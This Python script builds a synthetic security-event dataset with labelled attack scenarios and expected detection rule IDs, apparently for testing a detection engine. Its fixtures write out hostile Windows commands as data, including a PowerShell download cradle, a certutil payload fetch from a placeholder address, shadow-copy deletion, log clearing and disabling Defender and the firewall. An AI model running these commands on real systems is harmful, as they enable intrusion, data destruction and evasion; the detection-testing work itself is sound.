import argparse
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

USERS = [f"user{i:02d}" for i in range(1, 31)]
HOSTS = [f"ws-{i:02d}" for i in range(1, 31)]


def iso(dt):
    return dt.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")


def build_dataset(benign_events=3000, seed=42):
    random.seed(seed)
    start = datetime(2026, 8, 17, tzinfo=timezone.utc)
    events = []
    expected = {}

    for i in range(benign_events):
        ts = start + timedelta(seconds=i * 28)
        user = USERS[i % len(USERS)]
        host = HOSTS[(i * 7) % len(HOSTS)]
        if i % 3 == 0:
            failed = i % 97 == 0
            events.append({"timestamp": iso(ts), "source_type": "auth", "host": "sso-01", "user": user, "src_ip": f"192.0.2.{10 + i % 180}", "action": "login_failed" if failed else "login_success", "message": "Invalid password" if failed else "Authentication successful", "scenario": "benign"})
        elif i % 3 == 1:
            command = ["chrome.exe", "teams.exe", "code.exe", "notepad.exe", "python.exe app.py", "powershell.exe Get-Process"][i % 6]
            events.append({"timestamp": iso(ts), "source_type": "endpoint", "host": host, "user": user, "action": "process_start", "command": command, "message": "Process created", "scenario": "benign"})
        else:
            port = [443, 53, 80, 123][i % 4]
            events.append({"timestamp": iso(ts), "source_type": "network", "host": host, "user": user, "src_ip": f"10.0.1.{10 + i % 50}", "dst_ip": f"10.0.2.{10 + i % 100}", "dst_port": port, "action": "allowed", "message": "Routine network connection", "scenario": "benign"})

    base = start + timedelta(hours=23)

    def add(name, rows, rules):
        expected[name] = sorted(set(rules))
        for row in rows:
            row["scenario"] = name
            events.append(row)

    brute = [{"timestamp": iso(base + timedelta(seconds=j * 30)), "source_type": "auth", "host": "vpn-01", "user": "alex", "src_ip": "198.51.100.23", "action": "login_failed", "message": "Invalid password"} for j in range(5)]
    brute.append({"timestamp": iso(base + timedelta(minutes=3)), "source_type": "auth", "host": "vpn-01", "user": "alex", "src_ip": "198.51.100.23", "action": "login_success", "message": "Authentication successful"})
    add("attack_bruteforce_success", brute, ["AUTH-001", "AUTH-002"])

    spray_users = ["finance1", "finance2", "hr1", "sales1", "admin1"]
    add("attack_password_spray", [{"timestamp": iso(base + timedelta(minutes=5, seconds=j * 25)), "source_type": "auth", "host": "sso-01", "user": user, "src_ip": "198.51.100.77", "action": "login_failed", "message": "Invalid password"} for j, user in enumerate(spray_users)], ["AUTH-001", "AUTH-004"])

    add("attack_account_targeting", [{"timestamp": iso(base + timedelta(minutes=8, seconds=j * 30)), "source_type": "auth", "host": "vpn-02", "user": "sam", "src_ip": f"198.51.100.{120+j}", "action": "login_failed", "message": "Invalid password"} for j in range(6)], ["AUTH-003"])

    endpoint_cases = [
        ("attack_powershell_download", "powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://example.invalid/a')", "Process created", ["ENDPOINT-001"]),
        ("attack_encoded_powershell", "powershell.exe -enc SQBFAFgA", "Process created", ["ENDPOINT-002"]),
        ("attack_admin_creation", "net localgroup administrators temp /add", "User temp added to local administrators", ["ENDPOINT-003"]),
        ("attack_scheduled_task", "schtasks /create /tn Updater /tr C:\\Temp\\update.exe /sc onlogon", "Process created", ["ENDPOINT-005"]),
        ("attack_service_creation", "sc.exe create Updater binPath= C:\\Temp\\update.exe", "Process created", ["ENDPOINT-006"]),
        ("attack_run_key", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Temp\\update.exe", "Process created", ["ENDPOINT-007"]),
        ("attack_disable_defender", "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true", "Process created", ["ENDPOINT-008"]),
        ("attack_wmi", "wmic /node:ws-90 process call create cmd.exe", "Remote WMI process execution", ["ENDPOINT-009"]),
        ("attack_certutil", "certutil -urlcache -split -f http://203.0.113.50/payload.exe C:\\Temp\\payload.exe", "Process created", ["ENDPOINT-010"]),
        ("attack_office_shell", "powershell.exe", "WINWORD.EXE spawned powershell.exe", ["ENDPOINT-011"]),
        ("attack_shadow_delete", "vssadmin delete shadows /all /quiet", "Process created", ["ENDPOINT-012"]),
        ("attack_log_clear", "wevtutil cl Security", "Process created", ["ENDPOINT-013"]),
        ("attack_firewall_disable", "netsh advfirewall set allprofiles state off", "Process created", ["ENDPOINT-014"]),
    ]
    for offset, (name, command, message, rules) in enumerate(endpoint_cases):
        add(name, [{"timestamp": iso(base + timedelta(minutes=12 + offset)), "source_type": "endpoint", "host": f"ws-{40+offset}", "user": "sam", "action": "process_start", "command": command, "message": message}], rules)

    add("attack_credential_dump", [{"timestamp": iso(base + timedelta(minutes=26)), "source_type": "endpoint", "host": "ws-53", "user": "jordan", "action": "process_start", "command": "rundll32.exe", "message": "Suspicious access to LSASS detected"}], ["ENDPOINT-004"])
    add("attack_powershell_lsass", [
        {"timestamp": iso(base + timedelta(minutes=28)), "source_type": "endpoint", "host": "ws-54", "user": "jordan", "action": "process_start", "command": "powershell.exe Get-Process", "message": "Process created"},
        {"timestamp": iso(base + timedelta(minutes=29)), "source_type": "endpoint", "host": "ws-54", "user": "jordan", "action": "process_start", "command": "rundll32.exe", "message": "Suspicious access to LSASS detected"},
    ], ["BEHAVIOR-001", "ENDPOINT-004"])
    add("attack_high_risk_port", [{"timestamp": iso(base + timedelta(minutes=31)), "source_type": "network", "host": "ws-60", "user": "lee", "src_ip": "10.0.1.60", "dst_ip": "203.0.113.9", "dst_port": 4444, "action": "allowed", "message": "Outbound connection"}], ["NET-001"])

    ports = [21, 22, 23, 25, 53, 80, 135, 139, 443, 445]
    add("attack_network_scan", [{"timestamp": iso(base + timedelta(minutes=33, seconds=j * 5)), "source_type": "network", "host": "scanner-01", "user": "scanner", "src_ip": "10.0.9.50", "dst_ip": f"10.0.2.{10+j}", "dst_port": port, "action": "denied", "message": "Connection denied"} for j, port in enumerate(ports)], ["NET-001", "NET-002", "NET-003", "NET-004"])

    add("attack_multistage", [
        {"timestamp": iso(base + timedelta(minutes=37)), "source_type": "auth", "host": "vpn-01", "user": "casey", "src_ip": "198.51.100.200", "action": "login_success", "message": "Authentication successful"},
        {"timestamp": iso(base + timedelta(minutes=38)), "source_type": "endpoint", "host": "ws-61", "user": "casey", "action": "process_start", "command": "powershell.exe -enc SQBFAFgA", "message": "Process created"},
        {"timestamp": iso(base + timedelta(minutes=39)), "source_type": "endpoint", "host": "ws-61", "user": "casey", "action": "process_start", "command": "rundll32.exe", "message": "Suspicious access to LSASS detected"},
        {"timestamp": iso(base + timedelta(minutes=40)), "source_type": "network", "host": "ws-61", "user": "casey", "src_ip": "10.0.1.61", "dst_ip": "203.0.113.200", "dst_port": 4444, "action": "allowed", "message": "Outbound connection"},
    ], ["INCIDENT-001", "ENDPOINT-002", "ENDPOINT-004", "BEHAVIOR-001", "NET-001"])

    events.sort(key=lambda row: row["timestamp"])
    return events, expected


def write_dataset(events, expected, events_path, labels_path):
    events_path = Path(events_path)
    labels_path = Path(labels_path)
    events_path.parent.mkdir(parents=True, exist_ok=True)
    labels_path.parent.mkdir(parents=True, exist_ok=True)
    with events_path.open("w", encoding="utf-8") as handle:
        for event in events:
            handle.write(json.dumps(event, separators=(",", ":")) + "\n")
    with labels_path.open("w", encoding="utf-8") as handle:
        json.dump({"expected": expected}, handle, indent=2, sort_keys=True)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--benign-events", type=int, default=3000)
    parser.add_argument("--seed", type=int, default=42)
    parser.add_argument("--events", default="samples/large_mixed_events.jsonl")
    parser.add_argument("--labels", default="samples/large_mixed_labels.json")
    args = parser.parse_args()
    events, expected = build_dataset(args.benign_events, args.seed)
    write_dataset(events, expected, args.events, args.labels)
    print(f"Wrote {len(events)} events across {len(expected)} labeled attack scenarios")


if __name__ == "__main__":
    main()
